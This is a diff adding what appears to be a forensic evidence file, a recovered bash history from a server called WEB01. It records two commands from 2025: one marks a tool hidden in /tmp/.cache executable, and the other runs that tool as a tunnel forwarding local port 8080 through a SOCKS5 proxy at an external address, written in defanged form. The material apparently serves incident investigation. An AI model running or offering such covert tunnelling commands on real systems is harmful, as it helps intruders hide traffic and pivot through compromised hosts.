@@ -1,0 +1,4 @@
+# E-114-03: WEB01_bash_history.recovered
+2025-05-14 22:31:04 JST WEB01 bash_history.recovered
+chmod +x /tmp/.cache/gost
+/tmp/.cache/gost -L :8080 -F socks5://207[.]148[.]103[.]42:443
